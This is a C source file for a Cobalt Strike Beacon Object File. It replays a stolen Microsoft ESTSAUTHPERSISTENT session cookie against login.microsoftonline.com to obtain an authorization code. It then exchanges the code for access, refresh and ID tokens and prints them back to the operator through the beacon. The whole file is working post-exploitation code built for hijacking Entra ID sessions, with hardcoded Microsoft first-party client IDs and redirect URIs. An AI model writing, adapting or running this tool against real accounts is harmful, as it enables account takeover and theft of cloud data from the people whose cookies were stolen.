#include <Windows.h>
#include "base\helpers.h"
/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "sleepmask.h"
#include <winhttp.h>
#include <wchar.h>
#include <stdio.h>
#include <stringapiset.h>
//#pragma intrinsic(memcmp, memcpy,strcpy,strcmp,_stricmp,strlen)

#define MAX_BUFFER_SIZE 50000  // avg response was 39kb... fix this mess if you feel like it :)
    char* retrieveParamValue(char* responseData, DWORD responseLength, char* paramName);
    char* ExtractValueFromJson(const char* jsonResponse, const char* key);
    char* getRequestResponse(HINTERNET hRequest);
    LPCWSTR GetClientRedirectUrl(LPCWSTR client_id, LPCWSTR resource);
    char* Utf16ToUtf8(const wchar_t* input);
    wchar_t* Utf8ToUtf16(const char* input);
    void urlDecode(char* src, char* dest);
    void cleanup(HINTERNET* hSession, HINTERNET* hConnect, HINTERNET* hRequest);
#ifndef _DEBUG
    WINBASEAPI int __cdecl MSVCRT$sprintf(char* __stream, const char* __format, ...);
    DECLSPEC_IMPORT PCHAR __cdecl MSVCRT$strstr(const char* haystack, const char* needle);
    DECLSPEC_IMPORT PCHAR __cdecl MSVCRT$strchr(const char* haystack, int needle);
    DECLSPEC_IMPORT char* __cdecl MSVCRT$strncpy(char* dst, const char* src, size_t num);
    #define sprintf MSVCRT$sprintf
    #define strstr MSVCRT$strstr
    #define strchr MSVCRT$strchr
    #define strncpy MSVCRT$strncpy
#endif
#ifdef _DEBUG
    #pragma comment(lib, "Winhttp.lib")
    #define strstr strstr
    #define sprintf sprintf
#endif
    // Define the Dynamic Function Resolution declaration for the GetLastError function
    DFR(WINHTTP, WinHttpOpen);
    DFR(KERNEL32, GetLastError);
    DFR(WINHTTP, WinHttpOpenRequest);
    DFR(WINHTTP, WinHttpConnect);
    DFR(WINHTTP, WinHttpAddRequestHeaders);
    DFR(WINHTTP, WinHttpSendRequest);
    DFR(WINHTTP, WinHttpReceiveResponse);
    DFR(WINHTTP, WinHttpQueryDataAvailable);
    DFR(WINHTTP, WinHttpReadData);
    DFR(WINHTTP, WinHttpSetOption);
    DFR(WINHTTP, WinHttpQueryHeaders);
    DFR(WINHTTP, WinHttpCloseHandle);
    DFR(KERNEL32, HeapAlloc);
    DFR(KERNEL32, GetProcessHeap);
    DFR(KERNEL32, HeapFree);
    DFR(KERNEL32, MultiByteToWideChar);
    DFR(KERNEL32, WideCharToMultiByte);
    DFR(MSVCRT, strlen);
    DFR(MSVCRT, memcpy);
    DFR(MSVCRT, wcscpy);
    DFR(MSVCRT, wcscmp);
    DFR(MSVCRT, strtol);
    DFR(MSVCRT, wcslen);
    DFR(MSVCRT, strcpy);
    DFR(MSVCRT, strcmp);

    #define WinHttpOpen WINHTTP$WinHttpOpen
    #define GetLastError KERNEL32$GetLastError 
    #define WinHttpOpenRequest WINHTTP$WinHttpOpenRequest
    #define WinHttpConnect WINHTTP$WinHttpConnect
    #define WinHttpAddRequestHeaders WINHTTP$WinHttpAddRequestHeaders
    #define WinHttpSendRequest WINHTTP$WinHttpSendRequest
    #define WinHttpReceiveResponse WINHTTP$WinHttpReceiveResponse
    #define WinHttpQueryDataAvailable WINHTTP$WinHttpQueryDataAvailable
    #define WinHttpReadData WINHTTP$WinHttpReadData
    #define WinHttpSetOption WINHTTP$WinHttpSetOption
    #define WinHttpQueryHeaders WINHTTP$WinHttpQueryHeaders
    #define WinHttpCloseHandle WINHTTP$WinHttpCloseHandle
    #define HeapFree KERNEL32$HeapFree
    #define HeapAlloc KERNEL32$HeapAlloc
    #define GetProcessHeap KERNEL32$GetProcessHeap
    #define MultiByteToWideChar KERNEL32$MultiByteToWideChar
    #define WideCharToMultiByte KERNEL32$WideCharToMultiByte
    #define strlen MSVCRT$strlen
    #define wcslen MSVCRT$wcslen
    #define strcpy MSVCRT$strcpy
    #define memcpy MSVCRT$memcpy
    #define strcmp MSVCRT$strcmp
    #define wcscpy MSVCRT$wcscpy
    #define wcscmp MSVCRT$wcscmp
    #define strtol MSVCRT$strtol
    #define intFree(addr) HeapFree(GetProcessHeap(), 0, addr)
    #define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)

    void go(PCHAR args, int len) {
        // Grab parameter values from beacon parser
        datap parser = { 0 };
        BeaconDataParse(&parser, args, len);
        LPCWSTR client_id = (LPCWSTR)BeaconDataExtract(&parser, NULL);
        LPCWSTR tenant_id = (LPCWSTR)BeaconDataExtract(&parser, NULL);
        LPCWSTR resource = (LPCWSTR)BeaconDataExtract(&parser, NULL);
        LPCWSTR EstsAuthPersist = (LPCWSTR)BeaconDataExtract(&parser, NULL);

        // Check if any parameters are null
        if (client_id == NULL || tenant_id == NULL || resource == NULL || EstsAuthPersist == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "Not all required parameters were provided");
            return;
        }

        //Get Redirect URL
        LPCWSTR redirect_url = (LPCWSTR)GetClientRedirectUrl(client_id, resource);

        //Simpler doing somethings in wchar, and some in char, so ill just convert here. (i.e., couldn't get swprintf to work) 
        char* tenant_id_b = Utf16ToUtf8(tenant_id);
        char* client_id_b = Utf16ToUtf8(client_id);
        char* redirect_url_b = Utf16ToUtf8(redirect_url);

        //Initialize a http session
        HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
        hSession = WinHttpOpen(
            L"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);

        if (!hSession) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to initialize WinHTTP session, %i\n", GetLastError());
            return;
        }

        //Get a connection handle to the http session
        hConnect = WinHttpConnect(hSession, L"login.microsoftonline.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to connect to login.microsoftonline.com: %i", GetLastError());
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        //couldn't get swprintf to work. Since sprintf works witout issue, will just use that and convert to wide char after to pass to http functions
        char* get_uri_b = (char*)intAlloc(512 * sizeof(char));
        sprintf(get_uri_b, "/%s/oauth2/v2.0/authorize?redirect_uri=%s&response_type=code&scope=openid+offline_access&response_mode=query&client_id=%s", tenant_id_b, redirect_url_b, client_id_b);
        wchar_t* get_uri = Utf8ToUtf16(get_uri_b);

        BeaconPrintf(CALLBACK_OUTPUT, "Performing authorization code request");

        hRequest = WinHttpOpenRequest(hConnect, L"GET",
            get_uri,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

        //Don't need no more
        intFree(get_uri_b);
        get_uri_b = NULL;
        intFree(get_uri);
        get_uri = NULL;

        if (!hRequest) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to create HTTP request for auth code: %s\n", GetLastError());
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        // Disable automatic redirects
        DWORD redirectPolicy = WINHTTP_DISABLE_REDIRECTS;
        if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_DISABLE_FEATURE, &redirectPolicy, sizeof(redirectPolicy))) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to disable auto-redirects: %i ", GetLastError());
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        //Another nasty conversion to wchar since i couldnt get swprintf to work (i.e., reason im using both wchar and chars. Someone smarter than me can fix this lol).
        char* headers_b = (char*)intAlloc(4096 * sizeof(char));
        char* estsAuthPersist_b = Utf16ToUtf8(EstsAuthPersist);
        sprintf(headers_b, "Host: login.microsoftonline.com\nUser-Agent:%s\nCookie: ESTSAUTHPERSISTENT=%s", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)", estsAuthPersist_b);
        LPCWSTR headers = Utf8ToUtf16(headers_b);
        if (!WinHttpAddRequestHeaders(hRequest, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to add request headers for token request\n");
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        //Cleanup headers, don't need no more
        intFree(headers_b);
        intFree((void*)headers);
        headers_b = NULL;
        headers = NULL;


        if (!WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to send HTTP request to request an auth code\n");
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to recieve HTTP response from auth code request: %i", GetLastError());
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        char* fullBuffer = NULL;
        DWORD totalRead = 0;

        // Check if the response is a 302 redirect
        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL);

        if (statusCode != 302) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to request access token: %i");
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        fullBuffer = getRequestResponse(hRequest);
        char* bufferDecoded = (char*)intAlloc(strlen(fullBuffer) * sizeof(char));

        //url decode response for parsing
        urlDecode(fullBuffer, bufferDecoded);

        // Retrieve Authorization Code Flow
        char* code = NULL;
        char param[5] = "code";
        if ((code = retrieveParamValue(bufferDecoded, totalRead, param)) == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to retrieve authorization code\n");
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        //Cleanup buffers
        intFree(fullBuffer);
        intFree(bufferDecoded);
        fullBuffer = NULL;
        bufferDecoded = NULL;

        BeaconPrintf(CALLBACK_OUTPUT, "Successfully retrieved auth code!\n");



        // Prep POST Request
        char post_uri_b[100];
        sprintf(post_uri_b, "/%s/oauth2/token", tenant_id_b);
        wchar_t* post_uri = Utf8ToUtf16(post_uri_b);
        hRequest = WinHttpOpenRequest(hConnect, L"POST",
            post_uri,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

        //Cleanup post uri, don't need
        intFree(post_uri);

        if (!hRequest) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to create HTTP request to request access tokens: %s\n", GetLastError());
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "Performing access token request");

        // Send the POST request with the parameter data (permValue)
        char* postData = (char*)intAlloc(2048 * sizeof(char));
        char* resource_b = Utf16ToUtf8(resource);
        sprintf(postData, "client_id=%s&grant_type=authorization_code&redirect_uri=%s&scope=openid&resource=%s&code=%s", client_id_b, redirect_url_b, resource_b, code);

        if (!WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n",
            -1, (LPVOID)postData, strlen(postData), strlen(postData), 0)) {
            BeaconPrintf(CALLBACK_ERROR, "WinHttpSendRequest failed: ");
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        //Cleanup since not needed anymore
        intFree(postData);
        intFree(resource_b);
        postData = NULL;
        resource_b = NULL;

        // Receive the response
        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to recieve response from access token request: %i", GetLastError());
            cleanup(&hSession, &hConnect, &hRequest);
            return;

        }

        if (statusCode != 302) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to request access token: %i");
            cleanup(&hSession, &hConnect, &hRequest);
            return;
        }

        fullBuffer = NULL;
        fullBuffer = getRequestResponse(hRequest);
        char* access_token = ExtractValueFromJson(fullBuffer, "access_token");
        char* refresh_token = ExtractValueFromJson(fullBuffer, "refresh_token");
        char* id_token = ExtractValueFromJson(fullBuffer, "id_token");

        BeaconPrintf(CALLBACK_OUTPUT, "Access_Token: %s\nRefresh_Token: %s\nToken_ID %s", access_token, refresh_token, id_token);

        //Cleanup local vars
        intFree(fullBuffer);
        intFree(access_token);
        intFree(refresh_token);
        intFree(id_token);
        fullBuffer = NULL;
        access_token = NULL;
        refresh_token = NULL;
        id_token = NULL;

        cleanup(&hSession, &hConnect, &hRequest);
    }
}

// Cleanup internet handles
void cleanup(HINTERNET* hSession, HINTERNET* hConnect, HINTERNET* hRequest) {
    if (*hRequest) {
        WinHttpCloseHandle(*hRequest);
        *hRequest = NULL;
    }
    if (*hConnect) {
        WinHttpCloseHandle(*hConnect);
        *hConnect = NULL;
    }
    if (*hSession) {
        WinHttpCloseHandle(*hSession);
        *hSession = NULL;
    }
}


char* getRequestResponse(HINTERNET hRequest) {
    char* fullBuffer = NULL;
    DWORD totalRead = 0;
    DWORD dwAvailable = 0;
    do {
        if (!WinHttpQueryDataAvailable(hRequest, &dwAvailable)) {
            BeaconPrintf(CALLBACK_ERROR, "WinHttpQueryDataAvailable failed\n");
            break;
        }

        if (dwAvailable == 0) break;
        if (totalRead + dwAvailable > MAX_BUFFER_SIZE) {
            BeaconPrintf(CALLBACK_ERROR, "Response too large\n");
            break;
        }

        char* newBuffer = (char*)intAlloc(totalRead + dwAvailable + 1);
        if (!newBuffer) {
            BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed\n");
            break;
        }

        if (fullBuffer) {
            memcpy(newBuffer, fullBuffer, totalRead);
            intFree(fullBuffer);
        }
        fullBuffer = newBuffer;

        DWORD dwRead = 0;
        if (!WinHttpReadData(hRequest, fullBuffer + totalRead, dwAvailable, &dwRead)) {
            BeaconPrintf(CALLBACK_ERROR, "WinHttpReadData failed\n");
            break;
        }

        totalRead += dwRead;
        fullBuffer[totalRead] = '\0';
    } while (dwAvailable > 0);

    return fullBuffer;
}
char* retrieveParamValue(char* responseData,  DWORD responseLength, char* paramName ) {
    
    size_t paramLen = strlen(paramName);

    char* startindex = strstr(responseData, paramName);

    if (startindex) {
        //Set index to point to beginning of parameter value
        startindex += paramLen + 1; 

        // Get size of paramater value
        size_t valueLen = 0;
        while (startindex[valueLen] && startindex[valueLen] != '&') {
            valueLen++;
        }
        // Allocate space based off size of param value
        char* paramValue = (char*)intAlloc(valueLen + 1);

        // Copy value to buffer
        size_t i = 0;
        while (i < valueLen) {
            paramValue[i++] = *startindex++;
        }
        paramValue[i] = '\0';  // Null-terminate
        
        BeaconPrintf(CALLBACK_OUTPUT, "Extracted auth code successfully");
        return paramValue;
    }
    else {
        BeaconPrintf(CALLBACK_ERROR,"Failed to retrieve parameter value from response body \n");
    }
    return NULL;

}

// Function to extract a parameter's value from JSON-like string
char* ExtractValueFromJson(const char* jsonResponse, const char* key) {
    const char* keyStart = strstr(jsonResponse, key);
    if (!keyStart) {
        return NULL;
    }

    // Move past the key and any extra spaces and the colon
    keyStart += strlen(key) + 2;  

    // Now the value starts after the first quote
    if (*keyStart != '"') {
        return NULL; 
    }
    keyStart++;  

    // Find the closing quote
    const char* keyEnd = strchr(keyStart, '"');
    if (!keyEnd) {
        return NULL; 
    }

    // Calculate the length of the value
    size_t valueLen = keyEnd - keyStart;

    // Dynamically allocate memory for the value and copy it
    char* value = (char*)intAlloc(valueLen + 1);
    if (!value) {
        return NULL;  
    }

    // Copy the value
    strncpy(value, keyStart, valueLen);
    value[valueLen] = '\0';  

    return value;  // Caller must free this memory
}

// Function to retrieve redirec url based of client id 
LPCWSTR GetClientRedirectUrl(LPCWSTR clientId, LPCWSTR resource) {
    static wchar_t redirect_uri[256] = L"https://login.microsoftonline.com/common/oauth2/nativeclient";

    LPCWSTR oobClients[] = {
        L"d3590ed6-52b3-4102-aeff-aad2292ab01c", // Microsoft Office
        L"29d9ed98-a469-4536-ade2-f981bc1d605e", // Microsoft Authentication Broker
        L"9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"  // Microsoft Intune Company Portal
    };

    const struct {
        LPCWSTR clientId;
        LPCWSTR redirectUri;
    } clientMappings[] = {
        {L"1fec8e78-bce4-4aaf-ab1b-5451cc387264", L"https://login.microsoftonline.com/common/oauth2/nativeclient"},
        {L"9bc3ab49-b65d-410a-85ad-de819febfddc", L"https://oauth.spops.microsoft.com/"},
        {L"ab9b8c07-8f02-4f72-87fa-80105867a763", L"https://login.windows.net/common/oauth2/nativeclient"},
        {L"3d5cffa9-04da-4657-8cab-c7f074657cad", L"http://localhost/m365/commerce"},
        {L"dd762716-544d-4aeb-a526-687b73838a22", L"ms-appx-web://microsoft.aad.brokerplugin/dd762716-544d-4aeb-a526-687b73838a22"},
    };

    for (int i = 0; i < sizeof(clientMappings) / sizeof(clientMappings[0]); i++) {
        if (wcscmp(clientId, clientMappings[i].clientId) == 0) {
            wcscpy(redirect_uri, clientMappings[i].redirectUri);
            return redirect_uri;
        }
    }

    if (wcscmp(clientId, L"29d9ed98-a469-4536-ade2-f981bc1d605e") == 0 && wcscmp(resource, L"https://enrollment.manage.microsoft.com/") != 0) {
        wcscpy(redirect_uri, L"ms-aadj-redir://auth/drs");
        return redirect_uri;
    }

    for (int i = 0; i < sizeof(oobClients) / sizeof(oobClients[0]); i++) {
        if (wcscmp(clientId, oobClients[i]) == 0) {
            wcscpy(redirect_uri, L"urn:ietf:wg:oauth:2.0:oob");
            return redirect_uri;
        }
    }

    return redirect_uri;
}

char* Utf16ToUtf8(const wchar_t* input)
{
    int ret = WideCharToMultiByte(CP_UTF8,0,input,-1,NULL,0,NULL,NULL);

    char* newString = (char*)intAlloc(sizeof(char) * ret);

    ret = WideCharToMultiByte(CP_UTF8,0,input, -1,newString,sizeof(char) * ret,NULL,NULL);

    if (0 == ret)
    {
        goto fail;
    }

retloc:
    return newString;
    /*location to free everything centrally*/
fail:
    if (newString) {
        intFree(newString);
        newString = NULL;
    };
    goto retloc;
}

//release any global functions here
void bofstop()
{
#ifdef DYNAMIC_LIB_COUNT
    DWORD i;
    for (i = 0; i < loadedLibrariesCount; i++)
    {
        FreeLibrary(loadedLibraries[i].hMod);
    }
#endif
    return;
}

wchar_t* Utf8ToUtf16(const char* input){
    int ret = MultiByteToWideChar(CP_UTF8,0,input,-1,NULL,0);
    wchar_t* newString = (wchar_t*)intAlloc(sizeof(wchar_t) * ret);
    ret = MultiByteToWideChar(CP_UTF8,0,input,-1,newString,sizeof(wchar_t) * ret);

    if (0 == ret)
    {
        goto fail;
    }

retloc:
    return newString;
    /*location to free everything centrally*/
fail:
    if (newString) {
        intFree(newString);
        newString = NULL;
    };
    goto retloc;
}

void urlDecode(char* src, char* dest) {
    char* pSrc = src;
    char* pDest = dest;

    while (*pSrc) {
        if (*pSrc == '%' && *(pSrc + 1) && *(pSrc + 2)) {
            char hex[3] = { *(pSrc + 1), *(pSrc + 2), '\0' };
            *pDest++ = (char)strtol(hex, NULL, 16);  // Convert hex to char
            pSrc += 3;  // Skip past %XX
        }
        else {
            *pDest++ = *pSrc++;
        }
    }
    *pDest = '\0';  // Null-terminate
}

#if defined(_DEBUG) && !defined(_GTEST)

int wmain(int argc, wchar_t* argv[]) {
    // Run BOF's entrypoint
    if (argc < 5) {  // 1st argument is the program name
        wprintf(L"Usage: %s <client_id> <tenant_id> <resource> <estsauthp cookie>\n", argv[0]);
        return -1;
    }

    wchar_t* client_id = argv[1];
    wchar_t* tenant_id = argv[2];
    wchar_t* resource = argv[3];
    wchar_t* estsAuthPersistentCookie = argv[4];

    bof::runMocked<>(go, client_id,tenant_id, resource, estsAuthPersistentCookie);


    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got =
        bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
    };
    // It is possible to compare the OutputEntry vectors, like directly
    // ASSERT_EQ(expected, got);
    // However, in this case, we want to compare the output, ignoring the case.
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif
